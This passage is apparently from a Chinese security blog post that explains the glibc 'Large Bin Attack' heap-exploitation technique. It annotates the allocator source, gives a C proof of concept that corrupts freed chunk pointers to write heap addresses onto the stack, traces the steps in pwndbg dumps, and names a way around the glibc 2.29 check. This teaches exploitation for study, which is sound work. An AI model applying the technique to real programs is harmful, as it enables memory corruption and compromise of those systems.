&quot;最大chunk-&gt;bk_nextsize&quot; */</span></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> <span class="comment">/* 如果victim不是(不唯一是)largebin中最小的chunk */</span></span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">          <span class="comment">//从大到小（从头到尾）找到合适的位置</span></span><br><span class="line">          <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize; <span class="comment">/* 不断更新fwd,直到&quot;size&quot;&gt;=&quot;fwd-&gt;size&quot; */</span></span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">            </span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* 如果size刚好相等，就直接插入对应纵向列表的头部 */</span></span><br><span class="line">              fwd = fwd-&gt;fd; <span class="comment">/* fwd = 对应纵向列表的第一个chunk(跳过了头部) */</span></span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">/* 如果size不相等(&quot;size&quot;&gt;&quot;fwd-&gt;size&quot;)，就把victim加入到新的纵向链表 */</span></span><br><span class="line">              <span class="comment">/* fwd = 新纵向列表的头部 */</span></span><br><span class="line">              </span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;对应size小于victim的纵向链表&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;对应size大于victim的纵向链表&quot; */</span></span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(小于victim)-&gt;bk_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(大于victim)-&gt;fd_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk; <span class="comment">/* bck = 当前fwd的上一个chunk*/</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//如果largebin为空，将victim加入到纵向列表</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;victim-&gt;bk_nextsize&quot; */</span></span><br><span class="line">    <span class="comment">/* 再把 &quot;victim&quot; 装入 &quot;victim-&gt;fd_nextsize&quot; */</span></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index); <span class="comment">//把victim加入到的bin的表示为非空</span></span><br><span class="line"><span class="comment">//把victim加入到large bin的链表中</span></span><br><span class="line">victim-&gt;bk = bck; <span class="comment">/* bck = victim对应的下一个chunk */</span></span><br><span class="line">victim-&gt;fd = fwd; <span class="comment">/* fwd = victim对应的上一个chunk */</span></span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>发现以下规律：</p>
<ul>
<li>在纵向列表外部：对应的largebin从大到小组织各个纵向列表</li>
<li>在纵向列表内部：新加入的chunk直接插头，而位于表头的chunk固定不变（除非其余成员全部被申请）</li>
</ul>
<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>LargeBin Attack 就发生在堆块中 UnsortedBin 放入 LargeBin 的过程当中去</p>
<ul>
<li>写入第一个地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>如果我们对 victim-&gt;bk_nextsize 进行伪造，那么就可以控制程序写一个堆块地址到目标位置</p>
<ul>
<li>写入第二个地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
<p>如果我们可以控制 fwd-&gt;bk 位置，那么就可以写一个堆块地址到目标位置</p>
<p>下面就是利用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">/* 防止合并 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">/* long 在64位机器上时8字节 */</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./test </span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0x55ea64ab09a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0x55ea64ab09a0</span></span><br></pre></td></tr></table></figure>
<p>可以发现：两个栈地址上被写入了数据，接下来就看看具体的执行过程</p>
<p>“p1”和“p2”刚刚释放时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a360</span> —▸ <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* p2 -&gt; p1 -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
<p>不出意料的都放入了 unsortedbin ，接下来再进行申请时，ptmalloc就会根据“size”把目标chunk放入对应的bins中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a0a0</span></span><br><span class="line">    <span class="comment">/* p1(分割后) -&gt; main_arena */</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x500</span>: <span class="number">0x55555555a360</span> —▸ <span class="number">0x7ffff7dd1fa8</span> (main_arena+<span class="number">1160</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* 遍历到p1时就满足了分割的条件(从后往前),所以p1被分割,p2则放入了largebins */</span></span><br></pre></td></tr></table></figure>
<p>接下来释放p3，然后修改p2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a8a0</span> —▸ <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a8a0</span></span><br><span class="line">    <span class="comment">/* p3 -&gt; p1(分割后) -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x00007ffff7dd1fa8</span>	<span class="number">0x00007ffff7dd1fa8</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x000055555555a360</span>	<span class="number">0x000055555555a360</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdf00</span> <span class="comment">// stack_var1 - 2</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdef8</span> <span class="comment">// stack_var2 - 4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_var1 (<span class="number">0x7fffffffdf10</span>): <span class="number">0x55555555a8a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdf18</span>): <span class="number">0x55555555a8a0</span></span><br></pre></td></tr></table></figure>
<p>成功在“stack_var1”和“stack_var2”中写入了“p3”的地址，这就是利用了以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
<p>在“p2”覆盖完毕后，再次申请内存空间的过程中：</p>
<ul>
<li>p3会被写入largebin，它的结构如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b8a0</span></span><br><span class="line"><span class="number">0x55555555b8a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555b8b0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdf00</span> </span><br><span class="line">	<span class="comment">/* FD = p2			BK = stack_var1-2 */</span></span><br><span class="line"><span class="number">0x55555555b8c0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdef8</span></span><br><span class="line">	<span class="comment">/* fd_nextsize = p2			bk_nextsize = stack_var2-4 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在前面操作中，p2的size被修改，使得p3成为新的纵向列表头</li>
<li>因为 “p3-&gt;size” 大于 “p2-&gt;size”，所以p3将插入p2前面</li>
<li>下面的代码都是将解释p3进入largebin后的结构：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck <span class="comment">/* fwd初始化为原链表头 */</span></span><br><span class="line">fwd = fwd-&gt;fd_nextsize <span class="comment">/* 遍历链表寻找合适的fwd,最后找到fwd=p2(p2已经被伪造) */</span></span><br><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk <span class="comment">/* 这里的fwd就是p2,而fwd-&gt;bk则是&quot;stack_var1-2&quot; */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line">    </span><br><span class="line">victim-&gt;bk = bck <span class="comment">/* bk = stack_var1 - 2 */</span></span><br><span class="line">victim-&gt;fd = fwd <span class="comment">/* fd = p2 */</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize <span class="comment">/* bk_nextsize = stack_var2 - 4 */</span></span><br><span class="line">victim-&gt;fd_nextsize = fwd <span class="comment">/* fd_nextsize = p2 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后解释一下“stack_var1”和“stack_var2”被修改的原因：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line"></span><br><span class="line">fwd-&gt;bk_nextsize = victim <span class="comment">/* p2-&gt;bk_nextsize=victim */</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=victim */</span></span><br><span class="line">fwd-&gt;bk = victim <span class="comment">/* p2-&gt;bk=victim */</span></span><br><span class="line">bck-&gt;fd = victim <span class="comment">/* (stack_var1-2)-&gt;fd=victim */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdef8</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2-4</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ r8  <span class="number">0x7fffffffdf00</span> —▸ <span class="number">0x7fffffffdf40</span> —▸ <span class="number">0x555555555330</span> (__libc_csu_init) ◂— endbr64 <span class="comment">// stack_var1-2</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffdf08</span> —▸ <span class="number">0x5555555552c6</span> (main+<span class="number">316</span>) ◂— mov    rax, qword ptr [rbp - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555b8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555b8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br><span class="line">    <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=stack_var2 */</span></span><br><span class="line">    <span class="comment">/* (stack_var1-2)-&gt;fd=stack_var1 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b360</span> <span class="comment">/* p2 */</span></span><br><span class="line"><span class="number">0x55555555b360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555b370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br><span class="line"><span class="number">0x55555555b380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br></pre></td></tr></table></figure>
<h2 id="libc-2-30-的检测"><a href="#libc-2-30-的检测" class="headerlink" title="libc-2.30 的检测"></a>libc-2.30 的检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在 glibc2.29 中，增加了对双向链表完整性的检查，这样的检查方式正如同 glibc2.29 中增加的对 unsorted bin 类似，但是与其不同的是，这个检查只存在于插入的 unsorted chunk size 大于 chunk 时候，也就是说， <strong>如果我们构造一个小于所有 largebin 中堆块的 unsorted chunk，那么就可以成功利用上面那个分支操作</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(chunk_main_arena(fwd));</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        assert(chunk_main_arena(fwd));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">195</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">118</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.6m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">38:50</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
